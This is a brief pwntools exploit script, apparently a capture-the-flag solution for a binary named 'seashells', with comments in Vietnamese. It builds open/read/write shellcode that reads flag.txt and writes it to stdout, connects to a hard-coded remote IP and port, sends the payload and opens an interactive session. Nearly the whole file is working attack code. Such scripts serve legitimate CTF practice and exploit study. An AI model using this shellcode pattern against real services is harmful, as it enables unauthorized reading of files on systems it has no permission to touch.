from pwn import *

context.binary = './seashells'
context.arch = 'amd64'
context.os = 'linux'

filename = "flag.txt"

# Tạo shellcode để:
# 1. open("flag.txt", 0)
# 2. read(fd, rsp, 100)
# 3. write(1, rsp, 100)
shellcode = asm(
    shellcraft.open(filename) +
    shellcraft.read('rax', 'rsp', 100) +
    shellcraft.write(1, 'rsp', 100)
)

p = process('./seashells')
p=remote('43.205.113.100', 8871)
p.send(shellcode)
p.interactive()
